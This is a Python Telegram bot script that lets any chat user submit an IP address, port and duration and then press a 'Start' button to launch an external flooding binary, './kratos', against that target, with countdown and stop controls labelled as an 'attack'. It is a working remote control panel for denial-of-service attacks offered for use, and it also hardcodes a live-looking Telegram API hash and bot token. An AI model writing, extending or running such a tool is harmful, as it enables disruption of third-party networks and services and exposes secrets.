from telethon import TelegramClient, events, Button
import asyncio
import os


# Replace with your own values
api_id = "22157690"
api_hash = "819a20b5347be3a190163fff29d59d81"
bot_token = "7483201528:AAElIxI0_iaD1lxxHwcXtPBYDqZHQkaKlpE"

client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# Store running processes
running_processes = {}

@client.on(events.NewMessage(pattern=r"^(\d+\.\d+\.\d+\.\d+)\s(\d+)\s(\d+)$"))
async def handle_ip_port(event):
    ip, port, duration = event.pattern_match.groups()
    msg = await event.respond(
        f"Received IP: {ip}, Port: {port}, Duration: {duration}\nChoose an action:",
        buttons=[
            [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}" )]
        ]
    )
    # Store the message to update it later
    running_processes[(event.chat_id, ip, port)] = {'message': msg, 'duration': int(duration)}

@client.on(events.CallbackQuery(pattern=b"(start|stop)\|(\d+\.\d+\.\d+\.\d+)\|(\d+)(?:\|(\d+))?"))
async def handle_buttons(event):
    action, ip, port, duration = event.pattern_match.groups()
    chat_id = event.chat_id
    duration = int(duration.decode())

    if action == b"start":
        if (chat_id, ip, port) in running_processes:
            await event.answer("Attack is already running!", alert=True)
            return

        await event.answer("Starting the attack...", alert=True)
        process = await run_attack(chat_id, ip.decode(), port.decode(), duration)

        # Update message to show attack status and countdown
        msg = running_processes[(chat_id, ip, port)]['message']
        running_processes[(chat_id, ip, port)] = {'process': process, 'message': msg, 'duration': duration}
        await update_message(msg, ip.decode(), port.decode(), 'Attack ongoing', duration)

    elif action == b"stop":
        process_info = running_processes.pop((chat_id, ip, port), None)
        if process_info:
            process_info['process'].terminate()
            await event.answer("Attack stopped successfully!", alert=True)

            # Update message to show that the attack is stopped
            await update_message(process_info['message'], ip.decode(), port.decode(), 'Attack stopped', 0)
        else:
            await event.answer("No running attack to stop!", alert=True)

async def run_attack(chat_id, ip, port, duration):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./kratos {ip} {port} {duration} 750",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Start a countdown timer for the attack
        asyncio.create_task(countdown_timer(chat_id, ip, port, duration))
        return process
    except Exception as e:
        await client.send_message(chat_id, f"Failed to start attack: {e}")
        return None

async def countdown_timer(chat_id, ip, port, duration):
    for i in range(duration, 0, -1):
        await asyncio.sleep(1)
        await update_message(running_processes[(chat_id, ip, port)]['message'], ip, port, 'Attack ongoing', i)

async def update_message(msg, ip, port, status, remaining_time):
    # Update the original message with the new status and time
    updated_message = f"{ip}:{port}\nStatus: {status}\nTime remaining: {remaining_time}s" if status == 'Attack ongoing' else f"{ip}:{port}\nStatus: {status}"
    await msg.edit(updated_message)

if __name__ == "__main__":
    client.run_until_disconnected()
